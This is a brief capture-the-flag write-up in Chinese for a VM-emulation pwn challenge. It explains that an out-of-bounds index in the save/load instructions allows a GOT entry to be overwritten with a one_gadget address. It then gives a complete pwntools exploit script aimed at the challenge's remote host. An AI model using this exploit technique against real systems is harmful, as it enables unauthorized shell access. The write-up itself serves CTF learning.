实现了个简单vm

save和load有下标溢出，因此可以改stack的指针指向bss段，然后去读got表中的函数地址，加个偏移，变成one_gadget，再写回去

下面是payload

```python
from pwn import *

debug=0

context.log_level='debug'

if debug:
    p=process('./pwn')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com', 40003)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

bss = 0x4040D0

ru('Your program name:')
sl('Ch4r1l3')
ru('Your instruction:')
sl('push push save push push load push add push save')
ru('data:')

data = [bss,-3,-22,-22,(0xf1147-0x6F690),-22]

s = ''
for i in data:
    s += str(i)+' '

sl(s)

p.interactive()

```

